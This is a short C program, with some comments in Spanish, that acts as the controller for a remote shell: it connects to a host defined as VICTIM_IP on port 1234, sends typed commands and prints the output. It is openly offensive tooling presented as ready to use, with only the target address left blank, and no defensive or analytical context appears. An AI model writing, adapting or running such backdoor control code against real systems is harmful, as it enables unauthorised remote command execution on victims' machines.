#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define VICTIM_IP ""
#define PORT 1234
#define BUFFER_SIZE 1024

int main() {
    int sock;
    struct sockaddr_in victim_addr;
    char buffer[BUFFER_SIZE];
    char command[BUFFER_SIZE];

    // Crear socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("[!] Error while creating socket");
        exit(EXIT_FAILURE);
    }

    // Set up server address
    victim_addr.sin_family = AF_INET;
    victim_addr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, VICTIM_IP, &victim_addr.sin_addr) <= 0) {
        perror("[!] Invalid or unsupported address");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&victim_addr, sizeof(victim_addr)) < 0) {
        perror("[!] Error while connecting to the server");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("[+] Connected to the server\n");

    // Execute commands
    while (1) {
        printf("> ");
        fgets(command, BUFFER_SIZE, stdin);
        command[strcspn(command, "\n")] = '\0'; // Eliminar salto de línea
        if (strcmp(command, "quit") == 0) {
            printf("[+] Closing connection...\n");
            close(sock);
            exit(0);
        }

        send(sock, command, strlen(command), 0);

        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytes_received > 0) {
            printf("%s\n", buffer);
        }
    }

    close(sock);
    return 0;
}

